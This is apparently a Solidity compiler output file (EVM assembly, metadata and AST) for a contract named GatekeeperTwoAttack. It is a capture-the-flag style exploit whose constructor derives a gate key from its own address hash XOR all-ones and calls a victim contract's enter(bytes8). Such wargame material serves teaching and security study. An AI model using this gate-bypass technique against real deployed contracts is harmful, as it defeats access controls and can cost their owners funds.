									"begin": 347,
									"end": 425,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "5"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "tag",
									"source": 0,
									"value": "7"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP5",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP6",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP7",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "GAS",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "CALL",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "EQ",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "10"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "1F"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "3F"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP5",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "RETURNDATACOPY",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "9"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "tag",
									"source": 0,
									"value": "10"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "60"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "tag",
									"source": 0,
									"value": "9"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 60,
									"end": 436,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 436,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 60,
									"end": 436,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 436,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 436,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 60,
									"end": 436,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 436,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220058b6767aa89b9c541f6407d10b6831cc5d970179f3e906fc67bcbf70d2aed4b64736f6c634300060c0033",
									".code": [
										{
											"begin": 60,
											"end": 436,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 60,
											"end": 436,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 60,
											"end": 436,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 436,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 436,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 436,
											"name": "REVERT",
											"source": 0
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_victimContractAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/GateKeeperTwoAttack.sol\":\"GatekeeperTwoAttack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/GateKeeperTwoAttack.sol\":{\"keccak256\":\"0x54b33116d1090890bf103cff72513b5375a603eeb516cd1e1b8bfd7f9f70f1b0\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://4b380bb93014de0c2a8f718575f5dd98a8e0e17ddda57e0440f3605d8606367e\",\"dweb:/ipfs/QmfUmDpxLgLmzDMBhQPFmVAa7AvMyHtxCbc1gNxT3iCfPW\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "9302",
				"formattedMessage": "contracts/GateKeeperTwoAttack.sol:10:9: Warning: Return value of low-level calls not used.\n        _victimContractAddress.call(abi.encodeWithSignature(\"enter(bytes8)\", gateKey));\n        ^----------------------------------------------------------------------------^\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 425,
					"file": "contracts/GateKeeperTwoAttack.sol",
					"start": 347
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contracts/GateKeeperTwoAttack.sol": {
				"ast": {
					"absolutePath": "contracts/GateKeeperTwoAttack.sol",
					"exportedSymbols": {
						"GatekeeperTwoAttack": [
							47
						]
					},
					"id": 48,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 47,
							"linearizedBaseContracts": [
								47
							],
							"name": "GatekeeperTwoAttack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 45,
										"nodeType": "Block",
										"src": "224:209:0",
										"statements": [
											{
												"assignments": [
													7
												],
												"declarations": [
													{
														"constant": false,
														"id": 7,
														"mutability": "mutable",
														"name": "gateKey",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 45,
														"src": "235:14:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes8",
															"typeString": "bytes8"
														},
														"typeName": {
															"id": 6,
															"name": "bytes8",
															"nodeType": "ElementaryTypeName",
															"src": "235:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes8",
																"typeString": "bytes8"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 34,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint64",
																"typeString": "uint64"
															},
															"id": 32,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"arguments": [
																									{
																										"argumentTypes": null,
																										"id": 19,
																										"name": "this",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": -28,
																										"src": "308:4:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_contract$_GatekeeperTwoAttack_$47",
																											"typeString": "contract GatekeeperTwoAttack"
																										}
																									}
																								],
																								"expression": {
																									"argumentTypes": [
																										{
																											"typeIdentifier": "t_contract$_GatekeeperTwoAttack_$47",
																											"typeString": "contract GatekeeperTwoAttack"
																										}
																									],
																									"id": 18,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"lValueRequested": false,
																									"nodeType": "ElementaryTypeNameExpression",
																									"src": "300:7:0",
																									"typeDescriptions": {
																										"typeIdentifier": "t_type$_t_address_$",
																										"typeString": "type(address)"
																									},
																									"typeName": {
																										"id": 17,
																										"name": "address",
																										"nodeType": "ElementaryTypeName",
																										"src": "300:7:0",
																										"typeDescriptions": {
																											"typeIdentifier": null,
																											"typeString": null
																										}
																									}
																								},
																								"id": 20,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"kind": "typeConversion",
																								"lValueRequested": false,
																								"names": [],
																								"nodeType": "FunctionCall",
																								"src": "300:13:0",
																								"tryCall": false,
																								"typeDescriptions": {
																									"typeIdentifier": "t_address",
																									"typeString": "address"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_address",
																									"typeString": "address"
																								}
																							],
																							"expression": {
																								"argumentTypes": null,
																								"id": 15,
																								"name": "abi",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": -1,
																								"src": "283:3:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_magic_abi",
																									"typeString": "abi"
																								}
																							},
																							"id": 16,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"lValueRequested": false,
																							"memberName": "encodePacked",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": null,
																							"src": "283:16:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$",
																								"typeString": "function () pure returns (bytes memory)"
																							}
																						},
																						"id": 21,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "283:31:0",
																						"tryCall": false,
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					],
																					"id": 14,
																					"name": "keccak256",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": -8,
																					"src": "273:9:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																						"typeString": "function (bytes memory) pure returns (bytes32)"
																					}
																				},
																				"id": 22,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "273:42:0",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			],
																			"id": 13,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "266:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_bytes8_$",
																				"typeString": "type(bytes8)"
																			},
																			"typeName": {
																				"id": 12,
																				"name": "bytes8",
																				"nodeType": "ElementaryTypeName",
																				"src": "266:6:0",
																				"typeDescriptions": {
																					"typeIdentifier": null,
																					"typeString": null
																				}
																			}
																		},
																		"id": 23,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "266:50:0",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes8",
																			"typeString": "bytes8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes8",
																			"typeString": "bytes8"
																		}
																	],
																	"id": 11,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "259:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint64_$",
																		"typeString": "type(uint64)"
																	},
																	"typeName": {
																		"id": 10,
																		"name": "uint64",
																		"nodeType": "ElementaryTypeName",
																		"src": "259:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 24,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "259:58:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "^",
															"rightExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint64",
																			"typeString": "uint64"
																		},
																		"id": 30,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "30",
																					"id": 27,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "328:1:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					},
																					"value": "0"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					}
																				],
																				"id": 26,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "321:6:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint64_$",
																					"typeString": "type(uint64)"
																				},
																				"typeName": {
																					"id": 25,
																					"name": "uint64",
																					"nodeType": "ElementaryTypeName",
																					"src": "321:6:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 28,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "321:9:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint64",
																				"typeString": "uint64"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "-",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "31",
																			"id": 29,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "333:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			},
																			"value": "1"
																		},
																		"src": "321:13:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint64",
																			"typeString": "uint64"
																		}
																	}
																],
																"id": 31,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "320:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															},
															"src": "259:76:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint64",
																"typeString": "uint64"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint64",
																"typeString": "uint64"
															}
														],
														"id": 9,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "252:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes8_$",
															"typeString": "type(bytes8)"
														},
														"typeName": {
															"id": 8,
															"name": "bytes8",
															"nodeType": "ElementaryTypeName",
															"src": "252:6:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 33,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "252:84:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes8",
														"typeString": "bytes8"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "235:101:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "656e7465722862797465733829",
																	"id": 40,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "399:15:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_3370204ec98aba7f6a7e6f8e1821e3e93ed448423cd937e26bb3635897d85768",
																		"typeString": "literal_string \"enter(bytes8)\""
																	},
																	"value": "enter(bytes8)"
																},
																{
																	"argumentTypes": null,
																	"id": 41,
																	"name": "gateKey",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 7,
																	"src": "416:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes8",
																		"typeString": "bytes8"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_stringliteral_3370204ec98aba7f6a7e6f8e1821e3e93ed448423cd937e26bb3635897d85768",
																		"typeString": "literal_string \"enter(bytes8)\""
																	},
																	{
																		"typeIdentifier": "t_bytes8",
																		"typeString": "bytes8"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 38,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -1,
																	"src": "375:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 39,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodeWithSignature",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "375:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function (string memory) pure returns (bytes memory)"
																}
															},
															"id": 42,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "375:49:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 35,
															"name": "_victimContractAddress",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 3,
															"src": "347:22:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 37,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "call",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "347:27:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 43,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "347:78:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"id": 44,
												"nodeType": "ExpressionStatement",
												"src": "347:78:0"
											}
										]
									},
									"documentation": null,
									"id": 46,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 4,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 3,
												"mutability": "mutable",
												"name": "_victimContractAddress",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 46,
												"src": "180:30:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "180:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "179:32:0"
									},
									"returnParameters": {
										"id": 5,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "224:0:0"
									},
									"scope": 47,
									"src": "167:266:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 48,
							"src": "60:376:0"
						}
					],
					"src": "33:403:0"
				},
				"id": 0
			}
		}
	}
}